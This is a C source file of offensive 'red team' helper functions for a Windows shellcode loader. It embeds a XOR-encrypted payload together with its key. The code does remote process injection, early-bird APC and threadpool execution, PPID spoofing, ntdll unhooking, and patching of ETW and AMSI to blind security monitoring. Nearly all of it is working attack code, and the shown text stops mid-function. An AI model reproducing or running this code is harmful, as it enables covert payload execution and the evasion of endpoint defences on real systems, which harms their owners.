/*
 Red Team Operator helper functions

 author: reenz0h (twitter: @SEKTOR7net)
 credits: zerosum0x0, speedi13
 
*/

//#include "PEstructs.h"
//#include <windows.h>

#include "utils.h"
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strsafe.h>
#include <dbghelp.h>
//#include "helpers.h"
//#include <wincrypt.h>
#pragma comment (lib, "dbghelp.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(StatCode)  ((NTSTATUS)(StatCode) >= 0)
#endif


//xored payload
unsigned char payload[] = { 0x91, 0x31, 0xf0, 0x81, 0x93, 0x9a, 0xad, 0x74, 0x6b, 0x65, 0x24, 0x34, 0x2c, 0x29, 0x21, 0x34, 0x35, 0x3a, 0x54, 0xa6, 0xe, 0x2d, 0xee, 0x37, 0xd, 0x31, 0xf8, 0x37, 0x7b, 0x3a, 0xee, 0x26, 0x4b, 0x2d, 0xee, 0x17, 0x3d, 0x31, 0x7c, 0xd2, 0x29, 0x38, 0x28, 0x45, 0xa2, 0x2d, 0x54, 0xa5, 0xc1, 0x45, 0x12, 0x19, 0x61, 0x5e, 0x45, 0x35, 0xaa, 0xac, 0x68, 0x24, 0x6c, 0xb8, 0x91, 0x88, 0x31, 0x33, 0x34, 0x3c, 0xe0, 0x37, 0x45, 0xee, 0x2f, 0x45, 0x3b, 0x64, 0xb3, 0x14, 0xe4, 0xc, 0x73, 0x6e, 0x67, 0x10, 0x1f, 0xf2, 0xf3, 0xed, 0x63, 0x72, 0x65, 0x3c, 0xee, 0xa5, 0x11, 0x2, 0x25, 0x78, 0xa3, 0x35, 0xe8, 0x3a, 0x7d, 0x30, 0xe0, 0x25, 0x45, 0x2c, 0x6c, 0xa9, 0x90, 0x33, 0x2b, 0x8d, 0xac, 0x35, 0xe0, 0x51, 0xed, 0x2d, 0x6c, 0xaf, 0x3e, 0x54, 0xaa, 0x3a, 0x54, 0xb4, 0xc7, 0x24, 0xa4, 0xac, 0x60, 0x38, 0x72, 0xa4, 0x5b, 0x92, 0x10, 0x85, 0x27, 0x66, 0x29, 0x41, 0x65, 0x3c, 0x4a, 0xb4, 0x16, 0xaa, 0x3d, 0x30, 0xe0, 0x25, 0x41, 0x2c, 0x6c, 0xa9, 0x15, 0x24, 0xe8, 0x7e, 0x2d, 0x30, 0xe0, 0x25, 0x79, 0x2c, 0x6c, 0xa9, 0x32, 0xee, 0x67, 0xfa, 0x2d, 0x75, 0xbb, 0x24, 0x3d, 0x24, 0x35, 0x27, 0x2a, 0x3f, 0x22, 0x2a, 0x24, 0x2d, 0x2a, 0x3f, 0x2d, 0xe6, 0x81, 0x59, 0x32, 0x37, 0x9c, 0x92, 0x3d, 0x35, 0x32, 0x3f, 0x2d, 0xee, 0x7f, 0x90, 0x3c, 0x9a, 0x9c, 0x8d, 0x38, 0x1e, 0x6b, 0x2c, 0xdb, 0x12, 0x4, 0x17, 0x1a, 0xb, 0x6, 0x6, 0x65, 0x35, 0x3d, 0x2c, 0xec, 0x83, 0x21, 0xf0, 0x82, 0x24, 0xd9, 0x3e, 0x12, 0x52, 0x6c, 0x9a, 0xb0, 0x2d, 0x5c, 0xb0, 0x3b, 0x54, 0xb1, 0x3f, 0x54, 0xb4, 0x26, 0x54, 0xac, 0x24, 0x3d, 0x38, 0x23, 0x24, 0xd9, 0x48, 0x33, 0xd, 0xcc, 0x9a, 0xb0, 0x8c, 0xfe, 0x79, 0x73, 0x65, 0x39, 0x3a, 0xec, 0xb5, 0x2a, 0xdd, 0xde, 0x64, 0x6d, 0x79, 0x3e, 0x54, 0xaa, 0x33, 0x34, 0x35, 0x3a, 0xf, 0x66, 0x24, 0x3c, 0x38, 0xc9, 0x32, 0xea, 0xed, 0xa3, 0x8b, 0xbe, 0x8e, 0x1c, 0x3e, 0x25, 0xf0, 0xb2, 0x2d, 0x52, 0xa0, 0x2c, 0xfd, 0xb3, 0x28, 0x54, 0xac, 0x3f, 0x11, 0x73, 0x57, 0xa3, 0xf6, 0x37, 0x26, 0x2a, 0xdf, 0x8e, 0x30, 0x43, 0x42, 0x8c, 0xb0, 0x2b, 0xfb, 0xa3, 0x3c, 0xe8, 0xa6, 0x35, 0xf, 0x67, 0x26, 0x3b, 0xec, 0x92, 0xc8, 0x7a, 0x74, 0x6b, 0x65, 0xf, 0x65, 0x5, 0xf9, 0x40, 0x65, 0x63, 0x3b, 0xec, 0x94, 0x2a, 0xdc, 0x61, 0x65, 0x6d, 0x79, 0x32, 0xdf, 0x16, 0x34, 0xfb, 0xf2, 0x94, 0xb0, 0x2d, 0xec, 0x9c, 0x31, 0xfa, 0xbf, 0x2a, 0xb5, 0xa5, 0x8b, 0x94, 0x9a, 0x9a, 0x28, 0x5c, 0xb0, 0x21, 0x37, 0x22, 0xc8, 0x48, 0x72, 0x73, 0x1e, 0x9a, 0xb0, 0xe8, 0xb9, 0x7c, 0xe0, 0xfe, 0x73, 0x65, 0x74, 0x23, 0x9a, 0xaa, 0x6a, 0xe9, 0xf5, 0x72, 0x65, 0x63, 0x99, 0xd6, 0x9d, 0x8f, 0x64, 0x65, 0x65, 0x85, 0xfb, 0x8c, 0x9a, 0x9c, 0x5d, 0x27, 0x23, 0x5, 0x33, 0x65, 0x9f, 0x64, 0x69, 0x92, 0x5, 0xc8, 0x6b, 0x3, 0xa7, 0xf5, 0xf, 0xc5, 0x5, 0xb3, 0x3b, 0x9f, 0x0, 0xda, 0x73, 0x66, 0x20, 0x5d, 0x4e, 0x2d, 0xee, 0xd7, 0x55, 0xdc, 0x73, 0x98, 0xd6, 0xf, 0x87, 0x27, 0xcd, 0x49, 0x1b, 0x5a, 0xd3, 0x11, 0x6b, 0x98, 0x4b, 0x13, 0xe9, 0x27, 0xe3, 0x8a, 0xc6, 0xaa, 0xb2, 0xc7, 0x59, 0x43, 0xf6, 0x5e, 0x5f, 0xea, 0xe5, 0xcd, 0xdc, 0x93, 0x78, 0x44, 0x70, 0x21, 0xf4, 0x89, 0x29, 0xd9, 0x19, 0xac, 0x3, 0x6d, 0x2c, 0x0, 0x0, 0x11, 0x5f, 0x24, 0x13, 0xe, 0xb, 0x11, 0x5f, 0x4d, 0x34, 0x1c, 0x1f, 0xa, 0x1e, 0x9, 0x15, 0x44, 0x50, 0x4b, 0x55, 0x4d, 0x51, 0x24, 0xc, 0xd, 0x16, 0xa, 0x3, 0x18, 0x45, 0x2b, 0x31, 0x4d, 0x48, 0x43, 0x4b, 0x53, 0x49, 0x45, 0x23, 0x2, 0xb, 0x53, 0x51, 0x56, 0x59, 0xb, 0x53, 0x57, 0x5b, 0x45, 0x35, 0x1b, 0x15, 0x9, 0x0, 0x3a, 0x1c, 0x11, 0x2e, 0xa, 0x6, 0x4a, 0x41, 0x58, 0x52, 0x4b, 0x56, 0x5b, 0x59, 0x5b, 0x2e, 0x2b, 0x26, 0x28, 0x38, 0x47, 0x45, 0x9, 0xc, 0x6, 0x1c, 0x53, 0x22, 0x6, 0x11, 0xe, 0x1b, 0x42, 0x45, 0x26, 0xd, 0x1f, 0x16, 0x1e, 0x0, 0x4c, 0x4a, 0x5d, 0x5a, 0x5b, 0x4b, 0x51, 0x56, 0x5d, 0x48, 0x5d, 0x55, 0x43, 0x21, 0x4, 0x12, 0xa, 0x17, 0xc, 0x4a, 0x58, 0x4a, 0x44, 0x4b, 0x50, 0x44, 0x68, 0x7e, 0x6b, 0xd1, 0xd5, 0x43, 0xd2, 0x33, 0xef, 0x32, 0xcf, 0xaf, 0x78, 0xa, 0xdf, 0x26, 0xf0, 0xc8, 0x52, 0x3, 0xee, 0x68, 0xf, 0x70, 0x40, 0xa4, 0xf2, 0xb4, 0x4c, 0x44, 0x38, 0xdb, 0x77, 0xc8, 0xb0, 0xad, 0xfd, 0xda, 0xc2, 0x85, 0xeb, 0x52, 0x35, 0x37, 0x20, 0xc5, 0x43, 0x6e, 0x10, 0x1b, 0xbd, 0x25, 0xed, 0x6b, 0x5c, 0xe5, 0x14, 0x64, 0xc9, 0x30, 0x5, 0xd, 0x5e, 0x67, 0x16, 0x68, 0x96, 0xe8, 0x35, 0xe4, 0x45, 0xe4, 0xd, 0x3e, 0xc5, 0xc4, 0xd1, 0x84, 0xaf, 0x61, 0xf4, 0xa7, 0xc8, 0x72, 0x7e, 0x61, 0x4c, 0x8c, 0x6c, 0xc, 0xd8, 0x3b, 0x21, 0x64, 0x4f, 0xc4, 0x85, 0x27, 0xf5, 0xe2, 0x26, 0x7b, 0x97, 0x72, 0x2, 0x47, 0x40, 0x54, 0xac, 0xc, 0x50, 0xf7, 0x4, 0xb2, 0xc3, 0xa5, 0xef, 0x4, 0x58, 0xf4, 0x18, 0xcc, 0x6a, 0x3b, 0xbc, 0x9, 0x5f, 0x94, 0x59, 0x7d, 0xbf, 0xe8, 0x21, 0x3e, 0x37, 0xe, 0x72, 0xac, 0x91, 0x3c, 0xa, 0xa4, 0xb8, 0xdb, 0xf9, 0x2, 0x13, 0x27, 0x94, 0xd0, 0x54, 0x63, 0x22, 0x33, 0xc4, 0x86, 0xb4, 0x7f, 0x75, 0xd0, 0xca, 0x83, 0x50, 0xb8, 0xdd, 0xf3, 0xb3, 0x10, 0xa3, 0xc4, 0x96, 0x91, 0xce, 0x7a, 0x81, 0x68, 0x34, 0x21, 0x63, 0x33, 0xdb, 0x84, 0xde, 0xc7, 0x33, 0x9a, 0xb8, 0x31, 0x42, 0xac, 0xd9, 0x72, 0x65, 0x34, 0x6b, 0x24, 0xdd, 0x65, 0x7d, 0x79, 0x73, 0x24, 0xda, 0x32, 0x65, 0x74, 0x6b, 0x24, 0xdf, 0x3d, 0xc9, 0x2a, 0x96, 0x9a, 0xb6, 0x3a, 0xf6, 0x27, 0x38, 0x2d, 0xec, 0x82, 0x25, 0xf0, 0x82, 0x2d, 0xea, 0xa8, 0x24, 0xcc, 0x6b, 0x45, 0x65, 0x65, 0x24, 0xf0, 0x8a, 0x24, 0xd9, 0x60, 0xf3, 0xfd, 0x89, 0x9a, 0xb0, 0x2d, 0xee, 0xbd, 0x53, 0xe0, 0xa3, 0x6, 0xd3, 0x12, 0xe0, 0x62, 0x2d, 0x64, 0xae, 0xfc, 0xb3, 0x10, 0xb4, 0x2a, 0x3d, 0x2c, 0x23, 0x60, 0x65, 0x65, 0x6d, 0x79, 0x23, 0xa6, 0x8b, 0xd, 0x98, 0x8b, 0x94, 0x1, 0xd, 0x50, 0x1f, 0x1e, 0x46, 0x4, 0x6, 0x10, 0xa, 0x42, 0x12, 0x1d, 0x4b, 0x6, 0x1, 0x16, 0x6, 0x1, 0x5, 0x0, 0xa, 0x1a, 0x1f, 0x4b, 0xb, 0x0, 0x19, 0x79, 0x2d, 0xac, 0xf, 0xce };

// xor key
char key[] = "mysecretkeee";

LPVOID pRemoteCodeGlob = NULL;
HANDLE hThread = NULL;
unsigned int payload_len = sizeof(payload);
SIZE_T payload_len2 = sizeof(payload);




//taken from sektor7 malware intermediate course
//explanation here: ph3n1x.com
//or you can use this one from ParanoidNinja: https://github.com/paranoidninja/PIC-Get-Privileges/blob/main/addresshunter.h
HMODULE WINAPI hlpGetModuleHandle(LPCWSTR sModuleName) {

	// get the offset of Process Environment Block
#ifdef _M_IX86 
	PEB * ProcEnvBlk = (PEB *) __readfsdword(0x30);
#else
	PEB * ProcEnvBlk = (PEB *)__readgsqword(0x60);
#endif

	// return base address of a calling module
	if (sModuleName == NULL) 
		return (HMODULE) (ProcEnvBlk->ImageBaseAddress);

	PEB_LDR_DATA * Ldr = ProcEnvBlk->Ldr;
	LIST_ENTRY * ModuleList = NULL;
	
	ModuleList = &Ldr->InMemoryOrderModuleList;
	LIST_ENTRY *  pStartListEntry = ModuleList->Flink;

	for (LIST_ENTRY *  pListEntry  = pStartListEntry;  		// start from beginning of InMemoryOrderModuleList
					   pListEntry != ModuleList;	    	// walk all list entries
					   pListEntry  = pListEntry->Flink)	{
		
		// get current Data Table Entry
		LDR_DATA_TABLE_ENTRY * pEntry = (LDR_DATA_TABLE_ENTRY *) ((BYTE *) pListEntry - sizeof(LIST_ENTRY));

		// check if module is found and return its base address
		if (strcmp((const char *) pEntry->BaseDllName.Buffer, (const char *) sModuleName) == 0)
			return (HMODULE) pEntry->DllBase;
	}

	// otherwise:
	return NULL;
}






FARPROC WINAPI hlpGetProcAddress(HMODULE hMod, char * sProcName) {
	char * pBaseAddr = (char *) hMod;
	// get pointers to main headers/structures
	IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) pBaseAddr;
	IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (pBaseAddr + pDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
	IMAGE_DATA_DIRECTORY * pExportDataDir = (IMAGE_DATA_DIRECTORY *) (&pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
	IMAGE_EXPORT_DIRECTORY * pExportDirAddr = (IMAGE_EXPORT_DIRECTORY *) (pBaseAddr + pExportDataDir->VirtualAddress);
	// resolve addresses to Export Address Table, table of function names and "table of ordinals"
	DWORD * pEAT = (DWORD *) (pBaseAddr + pExportDirAddr->AddressOfFunctions);
	DWORD * pFuncNameTbl = (DWORD *) (pBaseAddr + pExportDirAddr->AddressOfNames);
	WORD * pHintsTbl = (WORD *) (pBaseAddr + pExportDirAddr->AddressOfNameOrdinals);
	// function address we're looking for
	void *pProcAddr = NULL;
	// resolve function by name	
		// parse through table of function names
		for (DWORD i = 0; i < pExportDirAddr->NumberOfNames; i++) {
			char * sTmpFuncName = (char *) pBaseAddr + (DWORD_PTR) pFuncNameTbl[i];
	
			if (strcmp(sProcName, sTmpFuncName) == 0)	{
				// found, get the function virtual address = RVA + BaseAddr
				pProcAddr = (FARPROC) (pBaseAddr + (DWORD_PTR) pEAT[pHintsTbl[i]]);
				break;
			}
		}
	return (FARPROC) pProcAddr;
}




/**
* Get the whole size of a module
*/
DWORD getSizeOfImage(HMODULE hMod){
	char* pBaseAddr = (char*)hMod;
	IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pBaseAddr;
	IMAGE_NT_HEADERS* pNTHdr = (IMAGE_NT_HEADERS*)(pBaseAddr + pDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER* pOptionalHdr = &pNTHdr->OptionalHeader;
	DWORD imageSize = pOptionalHdr->SizeOfImage;
	return imageSize;
}



/**
* Locate the .text section of a module
*/
void getTextSection(HMODULE hMod, IMAGE_SECTION_HEADER* textSection)
{
	char* pBaseAddr = (char*)hMod;
	// get pointers to main headers/structures
	IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pBaseAddr;
	IMAGE_NT_HEADERS* pNTHdr = (IMAGE_NT_HEADERS*)(pBaseAddr + pDosHdr->e_lfanew);
	//IMAGE_SECTION_HEADER* textSection = IMAGE_FIRST_SECTION(pNTHdr);
}





/**
* Copy the .text section of a unhooked DLL to overwrite a hooked DLL functions 
*/
BOOL unhook(HMODULE hookedDLL, LPVOID cleanDLL, DWORD protection){
	char* pBaseAddr = (char*)cleanDLL;
	DWORD64 hDLL1 = (DWORD64)hookedDLL;
	NTSTATUS success;
	HANDLE hCurProc = (HANDLE)0xffffffffffffffff;
	DWORD old = 0;
	// get pointers to main headers/structures
	IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pBaseAddr;
	IMAGE_NT_HEADERS* pNTHdr = (IMAGE_NT_HEADERS*)((DWORD64)pBaseAddr + pDosHdr->e_lfanew);
	int i;
	for (i = 0; i < pNTHdr->FileHeader.NumberOfSections; i++) 
	{
		IMAGE_SECTION_HEADER* cleanSectionHdr = (IMAGE_SECTION_HEADER*)((DWORD64)IMAGE_FIRST_SECTION(pNTHdr) + ((DWORD64)IMAGE_SIZEOF_SECTION_HEADER * i));
		if (!strcmp((char*)cleanSectionHdr->Name, txt)) 
		{
			// we change the protection of hooked .text section
			SIZE_T sizeOfTxtSec = sizeof(cleanSectionHdr->Misc.VirtualSize);
			LPVOID hAddr = (LPVOID)(hDLL1 + cleanSectionHdr->VirtualAddress);
			success = pVirtualProtect(hCurProc, &hAddr, (PULONG)&sizeOfTxtSec, 0x80, &protection); //we make the remote buffer RWX
			if (NT_SUCCESS(success)) {
				printf("[+]\tProtection of hooked .text section changed to rwx\n");
			}
			// we copy cleanDLL to hookedDLL
			success = pWriteMem((HANDLE)0xffffffffffffffff, hAddr, (PVOID)((DWORD64)cleanDLL + cleanSectionHdr->VirtualAddress), sizeOfTxtSec, (SIZE_T*)NULL);
			printf("[+]\tLocation of hooked .text section: %p\n", hAddr);
			if (success == 0x0)
				printf("[+]\tClean .text section copied to hooked .text sucessfully\n");
			//we restore the protection
			success = pVirtualProtect((HANDLE)0xffffffffffffffff, &hAddr, (PULONG)&sizeOfTxtSec, protection, &protection);
			if (success == 0x0)
				printf("[+]\tProtection restored\n");
		}
	}
	if (success == 0x0)
		return true;
	return false;
}



/**
*	Load NtQuerySystemInformation and use SYSTEM_PROCESS_INFORMATION structure to find the `procName` process and return its ID 
*/
int FindTarget(){
	ULONG ProcId = 0;
	myNtQuerySystemInformation penumProc = (myNtQuerySystemInformation)hlpGetProcAddress(hlpGetModuleHandle(masterDLL), qu3rySyst3m);
	// allocate large-enough buffer
	ULONG size = 1 << 18;
	void* buffer = nullptr;
	for (;;) {
		buffer = realloc(buffer, size);
		if (!buffer)
			return 1;
		ULONG needed;
		NTSTATUS status = penumProc(SystemExtendedProcessInformation, buffer, size, &needed);
		if (status == 0)	// success
			break;
		if (status == 0xC0000004) {
			size = needed + (1 << 12);
			continue;
		}
		return status;
	}
	auto p = (SYSTEM_PROCESS_INFORMATION*)buffer;
	for (;;) {
		if (!lstrcmpiW(p->ImageName.Buffer, procName)) {
			ProcId = HandleToULong(p->UniqueProcessId);
			break;
		}
		if (p->NextEntryOffset == 0)	// enumeration end
			break;
		p = (SYSTEM_PROCESS_INFORMATION*)((BYTE*)p + p->NextEntryOffset);
	}
	free(buffer);
	return ProcId;
}





/**
* Perun's Fart unhooking
* We start a suspended process and make a fresh copy of its ntdll functions to overwrite ours
*/
void perunfart(HANDLE hSusProc) {
	LPVOID pRemoteCode = NULL;// where the fresh ntdll is going to be stored
	NTSTATUS success;
	HANDLE hCurProc = (HANDLE)0xffffffffffffffff;// handle to current process
	DWORD oldPro = 0;
	DWORD dllSize1 = getSizeOfImage(dllModule);
	// we allocate buffer for our dll at pRemoteCode
	SIZE_T dllSize = getSizeOfImage(dllModule);
	success = pAllocMem(hCurProc, &pRemoteCode, 0, &dllSize, MEM_COMMIT, PAGE_READWRITE);
	if (success == 0x0)
		printf("[+]\tRW buffer created for dll: %p\n", pRemoteCode);
	// read ntdll from the suspended process and copy to local process
	PULONG bytesRead = NULL;
	success = pReadMem(hSusProc, (PVOID)dllModule, pRemoteCode, dllSize1, bytesRead);
	if (success == 0x0)
		printf("[+]\tNtdll copied from suspended to local process\n");
	TerminateProcess(hSusProc, 0);
	// we replace the hooked .text section with the clean one
	if (unhook(dllModule, pRemoteCode, oldPro))
		printf("[+]\tUnhook sucessfull :)\n");
}




/**
* Shellcode injection in a running process with NT functions
*/
void RemoteInject() {
	int pid = 0;
	HANDLE hProc = NULL;
	wchar_t procname[80] = L"notepad.exe";
	pid = FindTarget();
	OBJECT_ATTRIBUTES oa;
	oa = { sizeof(oa) };
	CLIENT_ID clientId = { (HANDLE)pid, NULL };
	LPVOID pRemoteCode = NULL;
	LPVOID baseAddress = NULL;
	HANDLE hThread = NULL;
	NTSTATUS success;
	DWORD error = GetLastError();
	CLIENT_ID cid;
	unsigned int payload_len = sizeof(payload);
	SIZE_T payload_len2 = sizeof(payload);
	if (pid) {
		NTSTATUS p = pOpenProcess(&hProc, PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
			PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, &oa, &clientId);
		//AESDecrypt((char*)payload, payload_len, (char*)key, sizeof(key));
		XOR((char*)payload, payload_len, (char*)key, sizeof(key));
		success = pAllocMem(hProc, &pRemoteCode, 0, &payload_len2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // we allocate buffer for our payload
		success = pWriteMem(hProc, pRemoteCode, (PVOID)payload, payload_len2, (SIZE_T*)NULL); //we copy our payload to the buffer
		DWORD old = 0;
		success = pVirtualProtect(hProc, &pRemoteCode, (PULONG)&payload_len2, PAGE_EXECUTE_READ, &old); //we make the remote buffer executable
		success = pRemoteThread(&hThread, GENERIC_ALL, NULL, hProc, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, NULL, NULL, NULL, NULL, NULL);
		if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
		}
		CloseHandle(hProc);
	}
}




/**
* Find the NtTraceEvent fonction adress and add a RET instruction to hook it
*/
void etwPatch() {
	/* https://whiteknightlabs.com/2021/12/11/bypassing-etw-for-fun-and-profit/ */
	/* https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-etw-x64.c */
	DWORD oldPro = 0;
	HANDLE hCurProc = (HANDLE)0xffffffffffffffff;
	NTSTATUS success;
	unsigned char patch[] = { '\xc3'};
	SIZE_T sizeOfPatch = sizeof(patch);
	LPVOID ptrNtTraceEvent = hlpGetProcAddress(dllModule, ntTraceEvent);
	printf("[+]\tLocation of NtTraceEvent: %p\n", ptrNtTraceEvent);
	char* value = (char*)ptrNtTraceEvent;
	printf("NtTraceEvent 3rd byte before patching: %04x\n", *(value+3));
	success = pVirtualProtect(hCurProc, &ptrNtTraceEvent, (PULONG)&sizeOfPatch, PAGE_EXECUTE_WRITECOPY, &oldPro); 
	if (NT_SUCCESS(success)) {
		printf("[+]\tProtection of NtTraceEvent changed to wcx\n");
	}
	success = pWriteMem(hCurProc, value+3, (PVOID)patch, 1, (SIZE_T*)NULL);
	if (NT_SUCCESS(success)) {
		printf("[+]\tRET instruction copied successfully\n");
		printf("NtTraceEvent 3rd byte after patching: %x\n", *(value + 3));
	}
	success = pVirtualProtect(hCurProc, &ptrNtTraceEvent, (PULONG)&sizeOfPatch, oldPro, &oldPro);
	if (NT_SUCCESS(success)) {
		printf("[+]\tProtection of NtTraceEvent restored\n");
		printf("[+]\tPatching successfull\n");
	}
}




/**
* XOR function with string key
*/
void XOR(char* data, size_t data_len, char* key, size_t key_len) {
	int j;
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}




void earlybird(PROCESS_INFORMATION pi) {
	DWORD old = 0;
	DWORD fail = (DWORD)-1;
	NTSTATUS success;
	LPVOID pRemoteCode = NULL;
	SIZE_T payload_len = sizeof(payload);
	SIZE_T payload_len2 = sizeof(payload);
	printf(" shellcode location: %p\n", payload);
	success = pAllocMem(pi.hProcess, &pRemoteCode, 0, &payload_len, MEM_COMMIT, PAGE_READWRITE); // we allocate buffer for our payload
	if (NT_SUCCESS(success)) {
		printf("[+]RW buffer created in suspended process: %p\n", pRemoteCode);
	}
	XOR((char*)payload, payload_len2, (char*)key, sizeof(key));
	success = pWriteMem(pi.hProcess, pRemoteCode, (PVOID)payload, payload_len, (SIZE_T*)NULL); //we copy our payload to the buffer
	if (NT_SUCCESS(success)) {
		printf("[+]\tPayload successfully copied to suspended process\n");
	}
	success = pVirtualProtect(pi.hProcess, &pRemoteCode, (PULONG)&payload_len, PAGE_EXECUTE_READ, &old); //we make the remote buffer RX
	if (NT_SUCCESS(success)) {
		printf("[+]\tRemote buffer marked as RX\n");
	}
	if (pQueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL) != 0)
		printf("[+]\tUser APC queued successfully\n");
	if (ResumeThread(pi.hThread) != fail);
	printf("[+]\tThread resumed :)\n");
}







void threadPool() {
	/* https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait */

	SIZE_T payload_len = sizeof(payload);
	SIZE_T payload_len2 = sizeof(payload);
	LPVOID pRemoteCode = NULL;
	HANDLE hp = (HANDLE)0xffffffffffffffff;
	NTSTATUS success;
	HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);
	success = pAllocMem(hp, &pRemoteCode, 0, &payload_len, MEM_COMMIT, PAGE_READWRITE); // we allocate buffer for our payload
	success = pWriteMem(hp, pRemoteCode, (PVOID)payload, payload_len, (SIZE_T*)NULL); //we copy our payload to the buffer
	DWORD old = 0;
	success = pVirtualProtect(hp, &pRemoteCode, (PULONG)&payload_len, PAGE_EXECUTE_READ, &old); //we make the remote buffer RX
	PTP_WAIT ptp_w = CreateThreadpoolWait((PTP_WAIT_CALLBACK)pRemoteCode, NULL, NULL);
	SetThreadpoolWait(ptp_w, event, 0);
	SetEvent(event);
	WaitForThreadpoolWaitCallbacks(ptp_w, FALSE);
	SetEvent(event);
	//WaitForSingleObject(event, INFINITE);
	while (TRUE)
	{
		Sleep(9000);
	}
}







PROCESS_INFORMATION ppid(SIZE_T attributeSize, STARTUPINFOEX six) {
	NTSTATUS success;
	HANDLE hProc = NULL;
	PROCESS_INFORMATION pi;
	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	six.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
	InitializeProcThreadAttributeList(six.lpAttributeList, 1, 0, &attributeSize);
	int pid = FindTarget();
	printf("[+]\tExplorer PID: %d\n", pid);
	OBJECT_ATTRIBUTES oa;
	oa = { sizeof(oa) };
	CLIENT_ID clientId = { (HANDLE)pid, NULL };
	success = pOpenProcess(&hProc, PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_PROCESS, &oa, &clientId); //PROCESS_CREATE_PROCESS is necessary for PPID spoofing
	if (NT_SUCCESS(success) && hProc != NULL) {
		printf("[+]\tHandle to process obtained!!\n");
	}
	if (UpdateProcThreadAttribute(six.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProc, sizeof(HANDLE), NULL, NULL) != 0)
		printf("[+]\tProcess props updated\n");
	six.StartupInfo.cb = sizeof(STARTUPINFOEX);

	if (CreateProcessA(0, (LPSTR)"notepad.exe", 0, 0, TRUE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, 0, 0, (LPSTARTUPINFOA)&six, &pi) == 0)
		printf("[!]\tFailed to create process. Error code: %u", GetLastError());
	return pi;
}






void amsiPatch() {
	/* https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch/blob/main/patch-amsi-x64.c */
	NTSTATUS success;
	DWORD oldPro = 0;
	HANDLE hCurProc = (HANDLE)0xffffffffffffffff;
	DWORD offset = 0x83;
	unsigned char patch[] = { '\x74' };
	SIZE_T sizeOfPatch = sizeof(patch);
	LPVOID ptrAm51Buff3r = hlpGetProcAddress(am51dll, am51Buff);
	printf("[+]\tLocation of AmsiScanBuffer: 0x%p\n", ptrAm51Buff3r);
	char* value = (char*)ptrAm51Buff3r;
	success = pVirtualProtect(hCurProc, &ptrAm51Buff3r, (PULONG)&sizeOfPatch, PAGE_EXECUTE_WRITECOPY, &oldPro);
	if (NT_SUCCESS(success)) {
		printf("[+]\tProtection of AmsiScanBuffer changed to wcx\n");
	}
	printf("[+]\tAmsiScanBuffer before patching: %x\n", *(value + offset));
	success = pWriteMem(hCurProc, value + offset, (PVOID)patch, 1, (SIZE_T*)NULL);
	if (NT_SUCCESS(success)) {
		printf("[+]\tPatch applied successfully\n");
		printf("[+]\tAmsiScanBuffer  after patching: %x\n", *(value + offset));
	}
	success = pVirtualProtect(hCurProc, &ptrAm51Buff3r, (PULONG)&sizeOfPatch, oldPro, &oldPro);
	if (NT_SUCCESS(success)) {
		printf("[+]\tProtection of AmsiScanBuffer restored\n");
		printf("[+]\tPatching successfull\n");
	}
}





/**
* For each threads of the process we SUSPEND it
*/
void NTinject() {
	HANDLE hProc = (HANDLE)0xffffffffffffffff;
	OBJECT_ATTRIBUTES oa;
	oa = { sizeof(oa) };
	CLIENT_ID clientId;
	LPVOID pRemoteCode = NULL;
	LPVOID baseAddress = NULL;
	NTSTATUS success;
	NTSTATUS p = pOpenProcess(&hProc, PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, &oa, &clientId);
	success = pAllocMem(hProc, &pRemoteCode, 0, &payload_len2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // we allocate buffer for our payload
	success = pWriteMem(hProc, pRemoteCode, (PVOID)payload, payload_len2, (SIZE_T*)NULL); //we copy our payload to the buffer
	pRemoteCodeGlob = pRemoteCode;
	DWORD old = 0;
	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
	if (hThread != NULL) {
		WaitForSingleObject(hThread, 500);
		CloseHandle(hThread);
	}
	CloseHandle(hProc);
}






/**
* For each threads of the process we SUSPEND it
*/
void DoSuspendThreads(DWORD targetProcessId, DWORD targetThreadId)
{
	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (h != INVALID_HANDLE_VALUE)
	{
		THREADENTRY32 te;
		te.dwSize = sizeof(te);
		if (Thread32First(h, &te))
		{
			do
			{
				if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID))
				{
					// Suspend all threads EXCEPT the one we want to keep running
